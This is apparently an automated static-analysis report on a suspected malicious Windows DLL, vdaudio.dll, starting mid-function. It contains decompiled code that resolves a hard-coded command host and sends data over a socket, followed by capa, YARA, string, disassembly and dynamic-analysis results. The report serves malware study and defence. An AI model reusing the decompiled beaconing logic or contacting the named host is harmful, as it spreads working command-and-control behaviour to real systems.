    int32_t iVar4;
    undefined *puVar5;
    undefined *puVar6;
    
    (*0x1000af5c)();
    10012552 = sub_100033b4();
    [0x0x10012588] = 1;
    [0x0x100126b4] = '\0';
    1001258c = 10012552;
    while (iVar1 = (*0x1000af34)("cn.mnemonicarx.biz"), iVar1 == 0) {
        if (([0x0x100126b4] != '\0') || ([0x0x10005181] != '\x02')) goto code_r0x10002b57;
        [0x0x100126b4] = '\x01';
    }
    10009891 = sub_10002b76();
    [0x0x100098a1] = 0x37721155;
    [0x0x1000988d] = 2;
    [0x0x1000989d] = 2;
    iVar1 = (*0x1000af68)();
    10005196 = '\0';
    iVar4 = 0;
    uVar2 = iVar1 + 0xf0U >> 10;
    while (0x3b < uVar2) {
        uVar2 = uVar2 - 0x3c;
        iVar4 = iVar4 + 1;
        if (iVar4 == 0x3c) {
            10005196 = 10005196 + '\x01';
            iVar4 = 0;
        }
    }
    [0x0x1000ae6e] = 0;
    puVar5 = 0x100033e4;
    puVar6 = 0x10005197;
    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
    }
    1000518f = [0x0x1000cd07];
    10005191 = [0x0x1000cd0b];
    10005195 = uVar2;
    [0x0x10005193] = 5;
    [0x0x1000988f] = 0x3500;
    [0x0x1000989f] = 0x3500;
    uVar3 = 0x1000988d;
    if (([0x0x10005181] != '\x02') || ([0x0x1000ae6d] == '\x01')) {
        uVar3 = 0x1000989d;
    }
    iVar1 = (*0x1000af58)([0x0x10012552], uVar3, 0x10);
    if (iVar1 == -1) {
        return;
    }
    [0x0x1000a1c7] = [0x0x1000a1c7] + '\x01';
    sub_100015d9([0x0x10012552], 0x10005183, 0x2c);
    (*0x1000af70)(0x36be, 0);
code_r0x10002b57:
    (*0x1000af4c)([0x0x10012552], 2);
    (*0x1000af50)([0x0x10012552]);
    return;
}

```
#### 2097 — sub_10001431
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 __fastcall sub_10001431(undefined4 param_1,undefined4 param_2)

{
    uint32_t in_EAX;
    undefined4 uStack_54;
    undefined4 uStack_48;
    undefined4 uStack_34;
    uint32_t uStack_30;
    code *pcStack_2c;
    undefined4 uStack_24;
    undefined4 uStack_20;
    undefined4 uStack_18;
    undefined4 uStack_14;
    undefined4 uStack_10;
    undefined4 uStack_c;
    undefined4 uStack_8;
    
    uStack_34 = 0x30;
    pcStack_2c = sub_10001314;
    uStack_24 = 1;
    uStack_30 = in_EAX ^ 3;
    uStack_20 = [0x0x1000b95b];
    uStack_14 = 0xd;
    uStack_c = 0x10005027;
    uStack_8 = 0;
    uStack_18 = 0;
    uStack_10 = param_2;
    jmp_user32.RegisterClassExA(&uStack_34);
    jmp_user32.CallWindowProcW(uStack_54, 0x112, 0x13, 0, 0);
    return CONCAT44(0x158090f, uStack_48);
}

```

### Structures (22)
| Name | EA |
|---|---|
| MZ | 0 |
| PE | 128 |
| OptionalHeader | 152 |
| Sections | 376 |
| kernel32.FT | 13312 |
| user32.FT | 13344 |
| ws2_32.FT | 13372 |
| gdi32.FT | 13392 |
| ntdll.FT | 13420 |
| ImportTable | 13456 |
| kernel32.OFT | 13576 |
| user32.OFT | 13608 |
| ws2_32.OFT | 13636 |
| gdi32.OFT | 13656 |
| ntdll.OFT | 13684 |
| ImportNames | 13708 |
| ExportDirectory | 14176 |
| ExportAddressTable | 14216 |
| ExportNameTable | 14228 |
| OrdinalNameTable | 14240 |
| ExportNames | 14246 |
| Relocations | 74752 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 8 · duration_s: 0.85

| Rule | ATT&CK | MBC |
|---|---|---|
| execute anti-debugging instructions |  | B0001.034:Debugger Detection |
| receive data |  | B0030.002:C2 Communication |
| set socket configuration |  | C0001.001:Socket Communication |
| receive data on socket |  | C0001.006:Socket Communication |
| create TCP socket |  | C0001.011:Socket Communication |
| delete file |  | C0047:Delete File |
| get file attributes |  | C0049:Get File Attributes |
| resolve function by parsing PE exports |  |  |

## PE Imports / Signals
import_count: 28

| label | api_match | ATT&CK |
|---|---|---|
| load_library | LoadLibrary | T1129 |

## YARA Matches (pipeline)
Total matches: 19

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| IP | - | $ipv6@12416 len=3 |
| contains_base64 | - | $a@11150 len=12 |
| maldoc_find_kernel32_base_method_1 | - | $a1@10064 len=7 |
| IsPE32 | - |  |
| IsDLL | - |  |
| IsWindowsGUI | - |  |
| Borland_Delphi_40_additional | - | $a@1812 len=5 |
| Microsoft_Visual_Cpp_v50v60_MFC | - | $a@1812 len=4 |
| Borland_Delphi_30_additional | - | $a@1812 len=4 |
| Borland_Delphi_30_ | - | $a@1812 len=4 |
| Borland_Delphi_Setup_Module | - | $a@1812 len=5 |
| Borland_Delphi_40 | - | $a@1812 len=5 |
| Borland_Delphi_v40_v50 | - | $a@1812 len=4 |
| Borland_Delphi_v30 | - | $a@1812 len=4 |
| Borland_Delphi_DLL | - | $a@1812 len=4 |
| SEH_Save | - | $a@2848 len=7 |
| SEH_Init | - | $a@2857 len=6; $b@4046 len=7 |
| Str_Win32_Winsock2_Library | - | $ws2_lib@11482 len=10 |

## Generated YARA Meta
```json
{
  "rule_count": 19,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$ipv6",
          "offset": 12416,
          "length": 3,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 11150,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "maldoc_find_kernel32_base_method_1",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a1",
          "offset": 10064,
          "length": 7,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE32",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": []
    },
    {
      "rule": "IsDLL",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": []
    },
    {
      "rule": "Borland_Delphi_40_additional",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 5,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Microsoft_Visual_Cpp_v50v60_MFC",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Borland_Delphi_30_additional",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Borland_Delphi_30_",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 4,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Borland_Delphi_Setup_Module",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 5,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Borland_Delphi_40",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 5,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Borland_Delphi_v40_v50",
      "path": "/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll",
      "strings": [
        {
          "id": "$a",
          "offset": 1812,
          "length": 4,
          "xor_ke
```

## FLOSS Strings
Total strings: 79 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 79}`

### High-signal FLOSS
- `LoadLibraryExA`
- `KERNEL32.dll`
- `RtlGetProcessHeaps`
- `kernel32`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.rdata`
- `@.data`
- `.reloc`
- `Z_^B[B]BX`
- `ntdll.dll`
- `@tJHPh|`
- `F< t)Iu`
- `f=//t	N`
- `</tf<:t`
- `</t	Iu`
- `tIHPhL`
- `advapi32`
- `ws2_32`
- `a[1Jnv`
- `JV  -A`
- `=-XXg(_`
- `DestroyCursor`
- `LoadMenuA`
- `PtInRect`
- `RegisterClassExA`
- `ReplyMessage`
- `CallWindowProcW`
- `USER32.dll`
- `DeleteFileA`
- `ExitProcess`
- `FatalExit`
- `GetLastError`
- `LoadLibraryExA`
- `lstrcpyA`
- `GetModuleHandleW`
- `KERNEL32.dll`
- `PolyBezierTo`
- `SetColorSpace`
- `SetTextColor`
- `SetWindowExtEx`
- `SetWorldTransform`
- `TextOutA`
- `gdi32.dll`
- `WS2_32.dll`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x10003316
```asm
┌ 15: entry0 ();
│           0x10003316      55             push ebp
│           0x10003317      8bec           mov ebp, esp
│           0x10003319      83c4e8         add esp, 0xffffffe8
│           0x1000331c      a115500010     mov eax, dword [0x10005015] ; [0x10005015:4]=1
│           0x10003321      c9             leave
└           0x10003322      c20c00         ret 0xc
```
### 0x10002ca8
```asm
┌ 19: sym.vdaudio.dll_gewayX ();
│           0x10002ca8      6a00           push 0
│           0x10002caa      6a10           push 0x10                   ; 16
│           0x10002cac      6857b90010     push 0x1000b957
│           0x10002cb1      50             push eax
│           0x10002cb2      51             push ecx
│           0x10002cb3      e8dc070000     call 0x10003494
│           0x10002cb8      48             dec eax
└           0x10002cb9      ffe1           jmp ecx
```
### 0x10002c95
```asm
┌ 19: sym.vdaudio.dll_gewayZ ();
│           0x10002c95      6a00           push 0
│           0x10002c97      6a10           push 0x10                   ; 16
│           0x10002c99      6857b90010     push 0x1000b957
│           0x10002c9e      50             push eax
│           0x10002c9f      51             push ecx
│           0x10002ca0      e8ef070000     call 0x10003494
│           0x10002ca5      48             dec eax
└           0x10002ca6      ffe1           jmp ecx
```
### 0x10002cc2
```asm
┌ 22: sym.vdaudio.dll_vdaudio ();
│           0x10002cc2      b8f0280010     mov eax, 0x100028f0
│           0x10002cc7      8d80e8030000   lea eax, [eax + 0x3e8]
│           0x10002ccd      ffd0           call eax
│           0x10002ccf      b8d5320010     mov eax, 0x100032d5
│           0x10002cd4      48             dec eax
│           0x10002cd5      ffd0           call eax
└           0x10002cd7      c3             ret
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `USER32.dll!ReplyMessage`
  - `USER32.dll!RegisterClassExA`
  - `USER32.dll!PtInRect`
  - `USER32.dll!LoadMenuA`
  - `USER32.dll!CallWindowProcW`
  - `KERNEL32.dll!lstrcpyA`
  - `KERNEL32.dll!LoadLibraryExA`
  - `KERNEL32.dll!DeleteFileA`
  - `KERNEL32.dll!ExitProcess`
  - `KERNEL32.dll!FatalExit`
  - `gdi32.dll!SetWorldTransform`
  - `gdi32.dll!SetWindowExtEx`
  - `gdi32.dll!SetTextColor`
  - `gdi32.dll!PolyBezierTo`
  - `gdi32.dll!SetColorSpace`
  - `WS2_32.dll!setsockopt`
  - `WS2_32.dll!socket`
  - `WS2_32.dll!recv`
  - `WS2_32.dll!closesocket`
  - `ntdll.dll!NtReadFile`
  - `ntdll.dll!NtQueryInformationFile`
  - `ntdll.dll!NtPrivilegeCheck`
  - `ntdll.dll!NtAlertThread`
  - `ntdll.dll!RtlGetProcessHeaps`
